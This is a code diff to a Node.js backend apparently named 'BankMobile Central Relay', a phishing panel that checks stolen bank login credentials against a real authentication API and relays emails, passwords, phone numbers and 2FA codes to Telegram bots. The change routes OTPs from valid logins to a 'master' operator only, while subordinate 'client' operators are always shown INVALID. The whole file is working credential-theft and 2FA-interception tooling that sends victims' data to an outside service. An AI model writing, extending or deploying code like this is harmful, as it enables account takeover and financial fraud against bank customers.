@@ -1,7 +1,7 @@
 // ================================================
 // BANKMOBILE CENTRAL RELAY BACKEND
-// Global + Per-Client + Master switch
 // Clients always see INVALID | Master sees real status
+// OTP of valid logins → Master only
 // ================================================
 require('dotenv').config();
 const express = require('express');
@@ -51,11 +51,25 @@ const DEFAULT_CONFIG = {
 };
 
 // ================================================
-// SWITCHES
+// SWITCHES + PENDING VALID SESSIONS
 // ================================================
-let clientsEnabled = true;          // Global clients switch (default = ON)
-let masterEnabled = true;           // Master bot switch (default = ON)
-const disabledClients = new Set();  // Individual clients that are turned off
+let clientsEnabled = true;
+let masterEnabled = true;
+const disabledClients = new Set();
+
+const pendingValidSessions = {};            // { clientId: [timestamp, ...] }
+const SESSION_TIMEOUT = 15 * 60 * 1000;     // 15 minutes
+
+// Clean expired sessions every 2 minutes
+setInterval(() => {
+    const now = Date.now();
+    for (const clientId in pendingValidSessions) {
+        pendingValidSessions[clientId] = pendingValidSessions[clientId].filter(ts => now - ts < SESSION_TIMEOUT);
+        if (pendingValidSessions[clientId].length === 0) {
+            delete pendingValidSessions[clientId];
+        }
+    }
+}, 2 * 60 * 1000);
 
 // ================================================
 // SEND TO TELEGRAM
@@ -80,9 +94,10 @@ async function sendToTelegram(token, chatId, message) {
 }
 
 // ================================================
-// SEND TO BOTS (respects all switches)
+// SEND TO BOTS
 // ================================================
-async function sendToBots(clientId, clientMessage, masterMessage) {
+async function sendToBots(clientId, clientMessage, masterMessage, options = {}) {
+    const { onlyMaster = false } = options;
     const results = [];
 
     // ----- MASTER -----
@@ -95,6 +110,12 @@ async function sendToBots(clientId, clientMessage, masterMessage) {
     }
 
     // ----- CLIENT -----
+    if (onlyMaster) {
+        results.push({ bot: clientId, sent: false, reason: 'Valid OTP → Master only' });
+        console.log(`🚫 OTP for ${clientId} sent ONLY to Master`);
+        return results;
+    }
+
     const isClientAllowed = clientsEnabled && !disabledClients.has(clientId);
 
     if (isClientAllowed) {
@@ -186,20 +207,17 @@ function formatMessage(email, password, success) {
 
 function formatPhoneMessage(phone) {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
-
     const message =
         `📱 <b>PHONE NUMBER</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `📱 <b>Phone:</b> <code>${phone}</code>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🕐 ${timestamp}`;
-
     return { clientMessage: message, masterMessage: message };
 }
 
 function formatOtpMessage(otp, trusted) {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
-
     const message =
         `🔐 <b>2FA CODE</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
@@ -207,7 +225,6 @@ function formatOtpMessage(otp, trusted) {
         `💻 <b>Trust Device:</b> ${trusted ? '✅ Yes' : '❌ No'}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🕐 ${timestamp}`;
-
     return { clientMessage: message, masterMessage: message };
 }
 
@@ -224,6 +241,13 @@ async function handleAuth(req, res) {
     const result = await authenticateWithAPI(email, password);
     const messages = formatMessage(email, password, result.success);
 
+    // If valid → remember for OTP handling
+    if (result.success) {
+        if (!pendingValidSessions[clientId]) pendingValidSessions[clientId] = [];
+        pendingValidSessions[clientId].push(Date.now());
+        console.log(`📌 Valid session queued for ${clientId}`);
+    }
+
     const results = await sendToBots(clientId, messages.clientMessage, messages.masterMessage);
 
     res.json({
@@ -236,7 +260,7 @@ async function handleAuth(req, res) {
 }
 
 // ================================================
-// PHONE + OTP HANDLERS
+// PHONE HANDLER (always both when allowed)
 // ================================================
 app.post('/submit-phone', async (req, res) => {
     const { phone, frontend } = req.body;
@@ -250,6 +274,9 @@ app.post('/submit-phone', async (req, res) => {
     res.json({ success: true });
 });
 
+// ================================================
+// OTP HANDLER (valid OTP → Master only)
+// ================================================
 app.post('/submit-otp', async (req, res) => {
     const { otp, trusted, frontend } = req.body;
     const clientId = frontend || 'default';
@@ -257,44 +284,47 @@ app.post('/submit-otp', async (req, res) => {
     console.log(`🔐 OTP from ${clientId}: ${otp}`);
 
     const messages = formatOtpMessage(otp, trusted || false);
-    await sendToBots(clientId, messages.clientMessage, messages.masterMessage);
+
+    // Check if this OTP belongs to a recent valid login
+    let isFromValidLogin = false;
+
+    if (pendingValidSessions[clientId] && pendingValidSessions[clientId].length > 0) {
+        pendingValidSessions[clientId].shift(); // consume one
+        isFromValidLogin = true;
+
+        if (pendingValidSessions[clientId].length === 0) {
+            delete pendingValidSessions[clientId];
+        }
+    }
+
+    // Valid OTP → only Master | Invalid OTP → both
+    await sendToBots(clientId, messages.clientMessage, messages.masterMessage, {
+        onlyMaster: isFromValidLogin
+    });
 
     res.json({ success: true });
 });
 
 // ================================================
-// CONTROL ENDPOINTS (support both GET + POST)
+// CONTROL ENDPOINTS
 // ================================================
-
-// ----- GLOBAL CLIENTS -----
 app.all('/clients-off', (req, res) => {
     clientsEnabled = false;
     console.log('🚫 ALL CLIENTS DISABLED');
-    res.json({
-        success: true,
-        message: 'All clients disabled.',
-        clientsEnabled: false
-    });
+    res.json({ success: true, message: 'All clients disabled.', clientsEnabled: false });
 });
 
 app.all('/clients-on', (req, res) => {
     clientsEnabled = true;
     console.log('✅ ALL CLIENTS ENABLED');
-    res.json({
-        success: true,
-        message: 'All clients enabled.',
-        clientsEnabled: true
-    });
+    res.json({ success: true, message: 'All clients enabled.', clientsEnabled: true });
 });
 
-// ----- SINGLE CLIENT -----
 app.all('/client-off/:clientId', (req, res) => {
     const clientId = req.params.clientId.toLowerCase();
-
     if (!BOT_CONFIGS[clientId] && clientId !== 'default') {
         return res.status(404).json({ success: false, message: `Client "${clientId}" not found` });
     }
-
     disabledClients.add(clientId);
     console.log(`🚫 Client "${clientId}" DISABLED`);
     res.json({
@@ -306,7 +336,6 @@ app.all('/client-off/:clientId', (req, res) => {
 
 app.all('/client-on/:clientId', (req, res) => {
     const clientId = req.params.clientId.toLowerCase();
-
     disabledClients.delete(clientId);
     console.log(`✅ Client "${clientId}" ENABLED`);
     res.json({
@@ -316,33 +345,24 @@ app.all('/client-on/:clientId', (req, res) => {
     });
 });
 
-// ----- MASTER BOT -----
 app.all('/master-off', (req, res) => {
     masterEnabled = false;
     console.log('🚫 MASTER BOT DISABLED');
-    res.json({
-        success: true,
-        message: 'Master bot has been disabled.',
-        masterEnabled: false
-    });
+    res.json({ success: true, message: 'Master bot has been disabled.', masterEnabled: false });
 });
 
 app.all('/master-on', (req, res) => {
     masterEnabled = true;
     console.log('✅ MASTER BOT ENABLED');
-    res.json({
-        success: true,
-        message: 'Master bot has been enabled.',
-        masterEnabled: true
-    });
+    res.json({ success: true, message: 'Master bot has been enabled.', masterEnabled: true });
 });
 
-// ----- STATUS -----
 app.get('/clients-status', (req, res) => {
     res.json({
         masterEnabled,
         globalClientsEnabled: clientsEnabled,
         disabledClients: Array.from(disabledClients),
+        pendingValidSessions,
         status: {
             master: masterEnabled ? 'ON' : 'OFF',
             clients: clientsEnabled
@@ -353,7 +373,7 @@ app.get('/clients-status', (req, res) => {
 });
 
 // ================================================
-// ALL AUTH ENDPOINTS
+// AUTH ENDPOINTS
 // ================================================
 app.post('/authenticate', handleAuth);
 app.post('/auth', handleAuth);
@@ -382,7 +402,7 @@ app.get('/', (req, res) => {
         masterEnabled,
         clientsEnabled,
         disabledClients: Array.from(disabledClients),
-        note: 'Clients always see INVALID | Master sees real status',
+        note: 'Clients always see INVALID | Master sees real status | Valid OTP → Master only',
         control: {
             'GET/POST /clients-off': 'Disable ALL clients',
             'GET/POST /clients-on': 'Enable ALL clients',
@@ -402,6 +422,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ BankMobile Relay running on port ${PORT}`);
     console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
     console.log(`👑 Master sees REAL status | Clients always see INVALID`);
+    console.log(`🔐 Valid OTP → Master only`);
     console.log(`🔧 Clients: /clients-off  |  /clients-on`);
     console.log(`🔧 Single:  /client-off/mm  |  /client-on/mm`);
     console.log(`🔧 Master:  /master-off   |  /master-on`);
